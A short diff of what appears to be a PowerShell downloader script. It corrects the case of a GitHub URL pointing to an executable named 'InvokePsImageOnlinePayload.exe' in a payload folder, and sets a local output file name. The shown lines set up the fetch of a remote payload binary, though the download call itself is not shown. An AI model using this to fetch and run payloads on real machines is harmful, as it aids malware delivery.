@@ -1,4 +1,4 @@
-$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/Invoke-PsImage/InvokePsImageOnlinePayload.exe'
+$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/Invoke-PSImage/InvokePsImageOnlinePayload.exe'
 $output = "InvokePsImageOnlinePayloadDownloaded.exe"
 $start_time = Get-Date
 
